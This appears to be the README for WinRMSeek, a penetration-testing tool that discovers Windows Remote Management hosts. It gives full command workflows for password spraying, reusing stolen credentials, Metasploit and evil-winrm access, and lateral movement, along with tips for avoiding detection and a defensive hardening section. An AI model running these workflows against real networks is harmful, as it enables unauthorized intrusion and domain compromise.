# WinRMSeek - Windows Remote Management Discovery

## Overview
WinRMSeek is a specialized reconnaissance tool for discovering and enumerating Windows Remote Management (WinRM) and PowerShell Remoting enabled hosts in a network. It identifies accessible WinRM services, tests authentication, and prepares targets for remote PowerShell access.

## What is WinRM?
**Windows Remote Management** (WinRM) is Microsoft's implementation of the WS-Management protocol, allowing remote management of Windows systems. It's the underlying technology for PowerShell Remoting and is commonly enabled in enterprise environments for system administration.

### Key Characteristics
- **Ports**: 5985 (HTTP), 5986 (HTTPS)
- **Protocol**: SOAP over HTTP/HTTPS
- **Authentication**: NTLM, Kerberos, Basic, Certificate
- **Common Use**: PowerShell Remoting, Remote Administration
- **Default State**: Disabled on workstations, often enabled on servers

## Features
- ✅ WinRM service discovery (HTTP and HTTPS)
- ✅ Port scanning (5985, 5986)
- ✅ Service detection and verification
- ✅ Authentication testing with credentials
- ✅ PowerShell Remoting capability detection
- ✅ Integration with evil-winrm for exploitation
- ✅ Concurrent multi-host scanning
- ✅ JSON export for further processing

## Installation

### Prerequisites
```bash
# Python 3.6+
python3 --version

# Required packages
pip install requests urllib3

# Optional: pywinrm for native WinRM testing
pip install pywinrm

# Optional: evil-winrm for exploitation (Linux/Kali)
sudo gem install evil-winrm
```

### Download
```bash
cd /path/to/seek-tools/
chmod +x winrmseek/winrmseek.py
```

## Usage

### Basic Commands
```bash
# Basic WinRM discovery
./winrmseek.py

# Scan specific targets
./winrmseek.py -f targets.txt

# Test authentication
./winrmseek.py -t -u administrator -p Password123

# HTTPS only (port 5986)
./winrmseek.py --ssl

# Verbose output
./winrmseek.py -v

# Fast scan (more concurrent workers)
./winrmseek.py -w 50
```

### Command-Line Options
```
Required (one of):
  IP address/CIDR         Single IP or CIDR range (e.g., 192.168.1.0/24)
  -f, --file FILE         File containing IP addresses

Authentication:
  -t, --test-auth         Test authentication with provided credentials
  -u, --username USER     Username for authentication (DOMAIN\user or user@domain)
  -p, --password PASS     Password for authentication
  
Connection Options:
  --ssl                   Use HTTPS only (port 5986)
  --ssl-only              Skip HTTP port (5985), only check HTTPS
  --timeout SECONDS       Connection timeout (default: 3)
  -w, --workers N         Concurrent threads (default: 10)
  
Output:
  -v, --verbose           Detailed output
  -o, --output DIR        Output directory (default: current)
  --json                  JSON output only
```

## Output Files

### winrmlist.txt
List of hosts with WinRM enabled:
```
192.168.1.10:5985 (HTTP)
192.168.1.11:5986 (HTTPS)
192.168.1.12:5985,5986 (HTTP,HTTPS)
```

### winrm_access.txt
Hosts where authentication succeeded:
```
192.168.1.10:5985 - Access Found (CORP\administrator)
192.168.1.12:5986 - Access Found (user@corp.local)
```

### winrm_details.txt
Human-readable detailed findings:
```
[+] 192.168.1.10
    WinRM-HTTP: OPEN (5985)
    WinRM-HTTPS: CLOSED
    Authentication: SUCCESS (CORP\administrator)
    Method: pywinrm
    
[+] 192.168.1.11
    WinRM-HTTP: CLOSED
    WinRM-HTTPS: OPEN (5986)
    Authentication: FAILED
```

### winrm_details.json
Machine-parseable JSON export:
```json
{
  "scan_time": "2025-10-13T14:30:00",
  "total_hosts": 254,
  "winrm_found": 12,
  "authenticated": 3,
  "results": [
    {
      "ip": "192.168.1.10",
      "winrm_http": true,
      "winrm_https": false,
      "open_ports": [5985],
      "authenticated": true,
      "username": "CORP\\administrator",
      "method": "pywinrm"
    }
  ]
}
```

## Attack Workflows

### Workflow 1: Basic Discovery
```bash
# 1. Discover WinRM-enabled hosts in subnet
./winrmseek.py 192.168.1.0/24

# 2. Review results
cat winrmlist.txt

# 3. Manually test access with known credentials
evil-winrm -i 192.168.1.10 -u administrator -p Password123
```

### Workflow 2: Credential Testing
```bash
# 1. Got credentials from another attack (e.g., Responder, password spraying)
# Username: CORP\admin
# Password: Winter2024!

# 2. Test which hosts accept these credentials
./winrmseek.py -f domain_computers.txt -t -u "CORP\admin" -p "Winter2024!"

# 3. Access found hosts
cat winrm_access.txt

# 4. Connect to compromised hosts
evil-winrm -i 192.168.1.10 -u admin -p "Winter2024!"
```

### Workflow 3: Post-Exploitation Pivot
```bash
# 1. Compromised one host, want to find other WinRM-enabled targets
./winrmseek.py -f internal_network.txt

# 2. Test reused local admin password
./winrmseek.py -f winrmlist.txt -t -u administrator -p "LocalAdmin123"

# 3. Access all vulnerable hosts
for ip in $(grep "Access Found" winrm_access.txt | cut -d: -f1); do
    evil-winrm -i $ip -u administrator -p "LocalAdmin123"
done
```

### Workflow 4: Domain Compromise
```bash
# 1. Got Domain Admin credentials
./winrmseek.py -f all_servers.txt -t -u "CORP\Domain Admins" -p "P@ssw0rd"

# 2. All domain-joined servers should accept creds
# Review successful authentications
cat winrm_access.txt

# 3. Lateral movement to high-value targets
evil-winrm -i dc01.corp.local -u "Domain Admins" -p "P@ssw0rd"
```

## Integration with Other Tools

### With evil-winrm
```bash
# 1. Discover targets
./winrmseek.py -f network.txt > discovered.txt

# 2. Test credentials
./winrmseek.py -f discovered.txt -t -u user -p pass

# 3. Connect to accessible hosts
evil-winrm -i TARGET_IP -u USER -p PASS

# 4. Run commands
evil-winrm -i TARGET_IP -u USER -p PASS -e "whoami /all"
```

### With CrackMapExec
```bash
# 1. Find WinRM hosts
./winrmseek.py 10.0.0.0/24

# 2. Use CME for credential spraying on WinRM hosts
crackmapexec winrm -f winrmlist.txt -u users.txt -p passwords.txt

# 3. Test successful creds with WinRMSeek
./winrmseek.py -f winrmlist.txt -t -u found_user -p found_pass
```

### With Impacket
```bash
# 1. Get credentials via secretsdump
secretsdump.py DOMAIN/user:pass@192.168.1.10

# 2. Test extracted credentials on WinRM hosts
./winrmseek.py -f servers.txt -t -u administrator -p extracted_pass

# 3. Access via evil-winrm
evil-winrm -i TARGET -u administrator -p extracted_pass
```

### With Metasploit
```bash
# 1. Discover WinRM targets
./winrmseek.py -f targets.txt

# 2. Use Metasploit's winrm_login module
use auxiliary/scanner/winrm/winrm_login
set RHOSTS file:winrmlist.txt
set USERNAME administrator
set PASSWORD Password123
run

# 3. Exploit with winrm_cmd
use exploit/windows/winrm/winrm_script_exec
set RHOST 192.168.1.10
set USERNAME administrator
set PASSWORD Password123
exploit
```

## Authentication Methods

### Username Formats
```bash
# Domain account (preferred for domain-joined hosts)
-u "DOMAIN\username"
-u "username@domain.com"

# Local account
-u ".\administrator"
-u "administrator"

# UPN format
-u "admin@corp.local"
```

### Authentication Types
- **NTLM**: Most common, works with local and domain accounts
- **Kerberos**: Domain accounts with proper DNS/SPN configuration
- **Basic**: Username/password over HTTPS (rarely used)
- **Certificate**: Client certificate authentication (enterprise)

## Common Scenarios

### Scenario 1: Password Spraying Success
```bash
# Found valid password 'Summer2024!' that works for multiple accounts
./winrmseek.py -f domain_computers.txt -t -u user1 -p "Summer2024!"
./winrmseek.py -f domain_computers.txt -t -u user2 -p "Summer2024!"
./winrmseek.py -f domain_computers.txt -t -u user3 -p "Summer2024!"
```

### Scenario 2: Local Admin Reuse
```bash
# Compromised one workstation, extracted local admin hash
# Test if same local admin password works on other systems
./winrmseek.py 192.168.0.0/16 -t -u administrator -p "LocalPass123"
```

### Scenario 3: Service Account Discovery
```bash
# Found service account in Group Policy or config file
# Service: CORP\svc-backup Password: BackupPass2024!
./winrmseek.py -f servers.txt -t -u "CORP\svc-backup" -p "BackupPass2024!"
```

### Scenario 4: Post-Kerberoasting
```bash
# Cracked Kerberos ticket, got service account password
# Username: svc-sql Password: Cracked123!
./winrmseek.py -f sql_servers.txt -t -u "CORP\svc-sql" -p "Cracked123!"
```

## Detection & Defense

### Detection Indicators
**Network Level**:
- Multiple connection attempts to ports 5985/5986
- Connections from unusual source IPs
- High volume of WinRM authentication attempts
- Failed authentication patterns

**Windows Event Logs**:
- Event ID 4624: Successful logon (Type 3 - Network)
- Event ID 4625: Failed logon attempts
- Event ID 4648: Explicit credential logon
- Event ID 91: WinRM connection accepted
- Event ID 142: Session created

**PowerShell Logs**:
- Event ID 4103: Module logging
- Event ID 4104: Script block logging
- Event ID 4105: Script start
- Event ID 4106: Script stop

### Defense Measures

1. **Disable WinRM where not needed**
```powershell
# Disable WinRM service
Stop-Service WinRM
Set-Service WinRM -StartupType Disabled

# Check status
Get-Service WinRM
```

2. **Restrict WinRM access**
```powershell
# Limit to specific IPs (management subnet)
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -RemoteAddress 10.0.0.0/24

# Require HTTPS only
Disable-PSRemoting -Force
Enable-PSRemoting -SkipNetworkProfileCheck -Force
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $false
```

3. **Use strong authentication**
```powershell
# Require Kerberos only (no NTLM)
Set-Item WSMan:\localhost\Service\Auth\Kerberos -Value $true
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $false
Set-Item WSMan:\localhost\Service\Auth\CredSSP -Value $false
```

4. **Enable logging**
```powershell
# Enable WinRM operational logs
wevtutil sl Microsoft-Windows-WinRM/Operational /e:true /rt:true

# Enable PowerShell logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name EnableModuleLogging -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
```

5. **Monitor for abuse**
```powershell
# Query for WinRM connections
Get-WinEvent -LogName Microsoft-Windows-WinRM/Operational | 
    Where-Object {$_.Id -eq 91} | 
    Format-List TimeCreated, Message

# Check for suspicious PowerShell sessions
Get-PSSession | Format-Table ComputerName, State, Availability, ConfigurationName
```

### Hardening Checklist
- [ ] WinRM disabled on workstations
- [ ] HTTPS required (no HTTP)
- [ ] Firewall rules limiting source IPs
- [ ] Strong passwords for admin accounts
- [ ] Kerberos-only authentication
- [ ] JEA (Just Enough Administration) configured
- [ ] Detailed logging enabled
- [ ] Regular log review and alerting
- [ ] MFA for privileged accounts
- [ ] Network segmentation (separate management VLAN)

## Troubleshooting

### No WinRM Found
```bash
# Verify hosts are online
./winrmseek.py -f targets.txt -v

# Check if ports are filtered
nmap -p 5985,5986 -Pn target.ip

# Verify WinRM is actually enabled on target
# (from target system)
winrm get winrm/config
```

### Authentication Fails
```bash
# Test credentials manually
evil-winrm -i TARGET -u USER -p PASS

# Check username format
-u "DOMAIN\user"    # Correct
-u "DOMAIN\\user"   # Wrong (double backslash)

# Verify account is not locked
net user USERNAME /domain

# Check if account has WinRM access
# (from target)
Get-PSSessionConfiguration
```

### Connection Timeout
```bash
# Increase timeout
./winrmseek.py --timeout 10

# Check network connectivity
ping target.ip
traceroute target.ip

# Verify firewall rules
# (from target)
Get-NetFirewallRule -Name "WINRM*"
```

### SSL/TLS Errors
```bash
# Use HTTP instead
./winrmseek.py --http-only

# Or force HTTPS
./winrmseek.py --ssl

# Test with curl
curl -v https://target:5986/wsman
```

## Tips & Best Practices

### 🎯 Reconnaissance Tips
- **Start broad**: Scan entire subnets to find all WinRM hosts
- **Focus on servers**: WinRM more common on servers than workstations
- **Check both ports**: Some orgs use HTTPS only, others use both
- **Test default creds**: Try administrator:password, admin:admin

### 🔒 Operational Security
- **Rate limiting**: Use fewer workers (`-w 5`) to avoid detection
- **Time windows**: Scan during business hours to blend in
- **Authenticated scans**: Use valid credentials to avoid failed login alerts
- **Clean up**: Remove any created sessions/artifacts

### ⚡ Performance Tips
- **Parallel scanning**: Increase workers for faster scans (`-w 50`)
- **Target selection**: Focus on likely targets (servers, DCs)
- **Timeout tuning**: Adjust timeout based on network latency
- **Batch processing**: Split large target lists into smaller chunks

### 🎓 Learning Resources
- Test on your own lab first
- Use Metasploitable or HackTheBox for practice
- Study Windows Event Logs to understand detection
- Practice with evil-winrm in CTF environments

## Real-World Examples

### Example 1: Internal Network Scan
```bash
./winrmseek.py 10.0.0.0/16 -w 100 -v
# Found 45 WinRM-enabled hosts out of 4,096 scanned
# Results saved to winrmlist.txt
```

### Example 2: Credential Validation
```bash
./winrmseek.py -f dc_servers.txt -t -u "CORP\administrator" -p "P@ssw0rd"
# [+] 10.0.0.10:5985 - Access Found (CORP\administrator)
# [+] 10.0.0.11:5985 - Access Found (CORP\administrator)
# [+] 10.0.0.12:5985 - Access Found (CORP\administrator)
```

### Example 3: Post-Compromise Lateral Movement
```bash
# After compromising one host via phishing
# Extract local admin password: LocalAdmin123
./winrmseek.py 192.168.1.0/24 -t -u administrator -p "LocalAdmin123"
# Found 18 hosts with same local admin password
# Lateral movement opportunities identified
```

## Exit Codes
- **0**: Success, WinRM hosts found
- **1**: No WinRM hosts found
- **2**: Authentication failed (all hosts)
- **3**: No targets to scan

## Limitations
- Cannot bypass firewall restrictions
- Requires network connectivity to targets
- Authentication testing needs valid credentials
- HTTPS requires proper certificate validation handling
- Windows-specific targets only

## Related Tools
- **evil-winrm**: WinRM exploitation and shell access
- **CrackMapExec**: Multi-protocol credential testing
- **Impacket**: Python Windows protocol implementations
- **Metasploit**: WinRM exploitation modules
- **PowerShell Empire**: Post-exploitation framework

## Credits
- Inspired by CrackMapExec and evil-winrm
- Uses Microsoft WS-Management protocol
- Integration with Impacket and evil-winrm projects

---
**Author**: Seek Tools Project  
**Version**: 1.0  
**Last Updated**: October 2025  
**License**: Use responsibly, authorized testing only
